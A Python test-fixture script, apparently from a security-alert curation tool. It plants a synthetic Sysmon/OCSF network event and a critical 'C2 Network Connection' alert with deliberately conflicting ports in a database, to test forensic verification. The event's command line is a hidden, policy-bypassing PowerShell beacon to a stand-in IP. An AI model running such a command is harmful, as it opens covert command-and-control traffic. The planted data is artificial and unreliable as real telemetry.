import json
from datetime import datetime, timezone
from sqlalchemy import text
from curator.db import SessionLocal
from curator.ai.narrative import generate_incident_narrative
from curator.ai.verify import verify_incident, format_forensic_event
from curator.pipeline.fixtures import inject_planted_alert

db = SessionLocal()

PLANTED_EVENT_ID = 999999
PLANTED_IP = "198.51.100.66"

# 1. Clean up any existing planted rows
db.execute(text("DELETE FROM alerts WHERE is_planted = true OR event_id = :eid"), {"eid": PLANTED_EVENT_ID})
db.execute(text("DELETE FROM events WHERE is_planted = true OR id = :eid"), {"eid": PLANTED_EVENT_ID})
db.commit()

# 2. Insert synthetic event with OCSF vs Raw port conflict
ocsf_payload = {
    "class_uid": 4001,
    "class_name": "Network Activity",
    "type_uid": 400101,
    "activity_id": 1,
    "activity_name": "Open",
    "time": 1588388850000,
    "time_dt": "2020-05-02T03:07:30.000000Z",
    "device": {"hostname": "SCRANTON.dmevals.local"},
    "actor": {
        "process": {
            "name": "powershell.exe",
            "file": {"name": "powershell.exe", "path": "C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"},
            "cmd_line": f"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-RestMethod -Uri https://{PLANTED_IP}:443/beacon\""
        },
        "user": {"name": "pbeesly"}
    },
    "src_endpoint": {"ip": "10.0.1.4", "port": 49721},
    "dst_endpoint": {"ip": PLANTED_IP, "port": 443}
}

raw_payload = {
    "EventID": 3,
    "SourceName": "Microsoft-Windows-Sysmon",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "UtcTime": "2020-05-02 03:07:30.000",
    "ProcessId": 2976,
    "Image": "C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": f"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-RestMethod -Uri https://{PLANTED_IP}:443/beacon\"",
    "User": "DMEVALS\\pbeesly",
    "SourceIp": "10.0.1.4",
    "SourcePort": 49721,
    "DestinationIp": PLANTED_IP,
    "DestinationPort": 8080,
    "DestinationPortName": "http-alt",
    "Protocol": "tcp",
    "Initiated": "true"
}

q_insert_event = text("""
    INSERT INTO events (
        id, ts, source, host, user_name, process_name, command_line,
        parent_process, event_code, src_ip, dst_ip, ocsf, raw, is_planted, incident_id
    ) VALUES (
        :id, :ts, :source, :host, :user_name, :process_name, :command_line,
        :parent_process, :event_code, :src_ip, :dst_ip, :ocsf, :raw, :is_planted, :incident_id
    )
""")

db.execute(q_insert_event, {
    "id": PLANTED_EVENT_ID,
    "ts": "2020-05-02 03:07:30.000000+00:00",
    "source": "Microsoft-Windows-Sysmon",
    "host": "SCRANTON.dmevals.local",
    "user_name": "pbeesly",
    "process_name": "C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "command_line": f"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-RestMethod -Uri https://{PLANTED_IP}:443/beacon\"",
    "parent_process": "C:\\windows\\system32\\cmd.exe",
    "event_code": "3",
    "src_ip": "10.0.1.4",
    "dst_ip": PLANTED_IP,
    "ocsf": json.dumps(ocsf_payload),
    "raw": json.dumps(raw_payload),
    "is_planted": True,
    "incident_id": 402,
})

# 3. Insert alerting row pointing to this synthetic event
q_insert_alert = text("""
    INSERT INTO alerts (
        event_id, rule_id, rule_name, severity, technique_ids,
        ts, host, user_norm, process_uid, is_planted, detail, incident_id
    ) VALUES (
        :event_id, :rule_id, :rule_name, :severity, :technique_ids,
        :ts, :host, :user_norm, :process_uid, :is_planted, :detail, :incident_id
    )
""")

db.execute(q_insert_alert, {
    "event_id": PLANTED_EVENT_ID,
    "rule_id": "CUR-003",
    "rule_name": "C2 Network Connection to Suspicious External IP",
    "severity": "critical",
    "technique_ids": ["T1071.001"],
    "ts": "2020-05-02 03:07:30.000000+00:00",
    "host": "SCRANTON",
    "user_norm": "pbeesly",
    "process_uid": f"proc_{PLANTED_EVENT_ID}",
    "is_planted": True,
    "detail": json.dumps({"planted": True, "note": "Step 5b demo false alert - port conflict"}),
    "incident_id": 402,
})
db.commit()

print("Inserted synthetic event 999999 and planted alert.")

# 4. Check formatting
ev_row = db.execute(text("SELECT id, ts, host, user_name, process_name, parent_process, command_line, event_code, src_ip, dst_ip, ocsf, raw FROM events WHERE id = 999999")).mappings().fetchone()
print("\nFormatted forensic event:")
print(format_forensic_event(dict(ev_row)))

db.close()
